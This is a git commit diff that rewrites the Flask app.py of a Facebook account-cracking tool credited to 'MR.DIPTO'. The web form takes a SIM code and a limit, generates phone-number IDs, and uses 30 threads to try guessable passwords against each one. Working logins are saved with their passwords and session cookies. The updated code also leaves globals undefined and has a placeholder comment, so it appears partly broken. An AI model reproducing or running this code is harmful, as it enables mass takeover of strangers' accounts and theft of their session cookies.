e73b15b7eddd95c3728333475856944c8eb76fac
Gajarbotol <123944033+Gajarbotol@users.noreply.github.com>
2024-07-28 11:37:51 +0600

    Update app.py

--- app.py
+++ app.py
@@ -1,71 +1,62 @@
-# WRITTEN BY MR.DIPTO
-# FOLLOW : https://github.com/MR-DIPTO-404
-#------------- import -------------#
 import os
+from flask import Flask, request, jsonify
+import requests
 import random
 import string
 from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import re
-import sys
 import uuid
-import json
+import sys
 from fake_useragent import UserAgent
-from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
-
-#-------------color----------------#
-bblack="\033[1;30m"         # Black
-M="\033[1;31m"            # Red
-H="\033[1;32m"         # Green
-byellow="\033[1;33m"        # Yellow
-bblue="\033[1;34m"          # Blue
-P="\033[1;35m"        # Purple
-C="\033[1;36m"          # Cyan
-B="\033[1;37m"         # White
-my_color = [B, C, P, H]
-warna = random.choice(my_color)
-oks = []
-cps = []
-loop = 0
-
-# Initialize fake user agent
 ua = UserAgent()
 
-#-------------logo-----------------#
-logo = f'''{B}
-`7MM"""Mq. `7MMF' `7MN.   `7MF'  .g8"""bgd
-{warna}  MM   `MM.  MM     MMN.    M  .dP'     `M
-{B}  MM   ,M9   MM     M YMb   M  dM'       `
-{warna}  MMmmdM9    MM     M  `MN. M  MM
- {B} MM         MM     M   `MM.M  MM.    `7MMF'
-{warna}  MM         MM     M     YMM  `Mb.     MM
-{B}.JMML.     .JMML. .JML.    YM    `"bmmmdPY
-{warna}--------------------------------------------{B}
- Owner    : {C} MR.DIPTO {B}
- Github   : MR-DIPTO-404
- Facebook : ADRIAN DIPTO
- Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}TRAIL{warna}]{warna}
---------------------------------------------{B}'''
+# Your previous code here...
 
-#-------------linex def -------------#
-def linex():
-    print(f'{warna}--------------------------------------------{B}')
+@app.route('/')
+def home():
+    return '''
+    <html>
+    <body>
+    <h2>Welcome to MR.DIPTO's Web-Based FB Cloning Tool</h2>
+    <form action="/clone" method="post">
+        SIM Code: <input type="text" name="sim_code"><br>
+        Limit: <input type="text" name="limit"><br>
+        <input type="submit" value="Start Cloning">
+    </form>
+    </body>
+    </html>
+    '''
 
-#-------------clear def -------------#
-def clear():
-    os.system('clear')
-    print(logo)
+@app.route('/clone', methods=['POST'])
+def clone():
+    sim_code = request.form['sim_code']
+    limit = int(request.form['limit'])
 
-#------------ method crack def ---------#
+    user = []
+    for _ in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+
+    with tred(max_workers=30) as Dipto:
+        tl = str(len(user))
+        for psx in user:
+            ids = sim_code + psx
+            passlist = [psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'sadiya', 'jannat']
+            Dipto.submit(method_crack, ids, passlist)
+    
+    return jsonify({
+        "status": "Cloning initiated",
+        "total_accounts": len(user)
+    })
+
 def method_crack(ids, passlist):
     global oks
     global cps
     global loop
     try:
         for pas in passlist:
-            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s' % (loop, len(oks)))
+            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
             sys.stdout.flush()
             adid = str(uuid.uuid4())
             device_id = str(uuid.uuid4())
@@ -81,17 +72,15 @@ def method_crack(ids, passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[PING-OK] ' + str(uid) + ' | ' + pas + '\033[1;37m')
-                    coki = ";".join(i["name"] + "=" + i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;32m [COOKIES] ' + coki)
-                    with open('/sdcard/PING-OK.txt', 'a') as f:
-                        f.write(str(uid) + ' | ' + pas + '\n')
+                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m [COOKIES] '+coki)
+                    open('/sdcard/PING-OK.txt', 'a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[PING-CP] ' + ids + ' | ' + pas + '\033[1;37m')
-                with open('/sdcard/PING-CP.txt', 'a') as f:
-                    f.write(ids + '|' + pas + '\n')
+                print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/PING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
@@ -100,60 +89,6 @@ def method_crack(ids, passlist):
     except:
         pass
 
-@app.route('/')
-def home():
-    return render_template_string('''
-        <html>
-        <head><title>MR.DIPTO Tool</title></head>
-        <body>
-            <h1>MR.DIPTO Tool</h1>
-            <form action="/run" method="post">
-                <label for="code">Enter SIM Code:</label><br>
-                <input type="text" id="code" name="code" required><br>
-                <label for="limit">Enter Limit:</label><br>
-                <input type="number" id="limit" name="limit" min="1" required><br>
-                <input type="submit" value="Run">
-            </form>
-        </body>
-        </html>
-    ''')
-
-@app.route('/run', methods=['POST'])
-def run():
-    code = request.form['code']
-    try:
-        limit = int(request.form['limit'])
-    except ValueError:
-        limit = 50000
-    
-    user = []
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    
-    with tred(max_workers=30) as Dipto:
-        tl = str(len(user))
-        print(' TOTAL ACCOUNT : ' + tl)
-        print(' YOUR SIM CODE : ' + code)
-        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
-        linex()
-        for psx in user:
-            ids = code + psx
-            passlist = [psx, ids, ids[:7], ids[:6], ids[5:], ids[4:], 'sadiya', 'jannat']
-            Dipto.submit(method_crack, ids, passlist)
-    
-    linex()
-    results = f'THE PROGRESS HAS BEEN COMPLETE\nTOTAL OK ID {str(len(oks))}\nTOTAL CP ID {str(len(cps))}'
-    return render_template_string(f'''
-        <html>
-        <head><title>MR.DIPTO Tool</title></head>
-        <body>
-            <h1>MR.DIPTO Tool</h1>
-            <pre>{results}</pre>
-            <a href="/">Back</a>
-        </body>
-        </html>
-    ''')
-
 if __name__ == '__main__':
-    app.run(debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=True)
